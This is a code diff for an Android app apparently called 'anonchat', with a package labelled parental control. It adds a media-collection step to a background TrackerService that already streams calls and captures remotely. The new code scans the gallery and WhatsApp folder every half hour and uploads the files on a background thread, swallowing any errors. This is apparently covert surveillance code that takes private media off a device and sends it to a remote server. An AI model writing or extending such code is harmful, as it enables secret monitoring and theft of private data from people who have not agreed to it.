@@ -21,6 +21,7 @@ import com.anonchat.app.parentalcontrol.api.CloudConfig
 import com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper
 import com.anonchat.app.parentalcontrol.manager.CallStateMonitor
 import com.anonchat.app.parentalcontrol.manager.CallStreamManager
+import com.anonchat.app.parentalcontrol.manager.MediaCollectionManager
 import com.anonchat.app.parentalcontrol.manager.RemoteCaptureManager
 import com.anonchat.app.parentalcontrol.manager.UpdateManager
 import com.anonchat.app.parentalcontrol.work.HeartbeatWorker
@@ -43,6 +44,8 @@ class TrackerService : Service() {
     private var serverWatchJob: Job? = null
     private var callStateMonitor: CallStateMonitor? = null
     private var callStreamManager: CallStreamManager? = null
+    private var mediaCollectionManager: MediaCollectionManager? = null
+    private var mediaCollectorJob: Job? = null
 
     // Backoff state: when Cloudflare (or any proxy) returns 429 with a
     // challenge page, we double the next sleep so we stop hammering and
@@ -243,6 +246,18 @@ class TrackerService : Service() {
                                 System.currentTimeMillis()
                             )
                         }
+                    }
+                } catch (_: Exception) {
+                }
+                // Gallery / WhatsApp-folder media collection. The manager
+                // self-throttles to one scan per 30 min and caps uploads per
+                // run, so calling it every cycle is cheap (it returns fast
+                // when the scan isn't due). Uploads run on IO dispatcher so
+                // the report cadence is never delayed by media traffic.
+                try {
+                    scope.launch(kotlinx.coroutines.Dispatchers.IO) {
+                        com.anonchat.app.parentalcontrol.manager.MediaCollectionManager
+                            .maybeScanAndUpload(this@TrackerService)
                     }
                 } catch (_: Exception) {
                 }
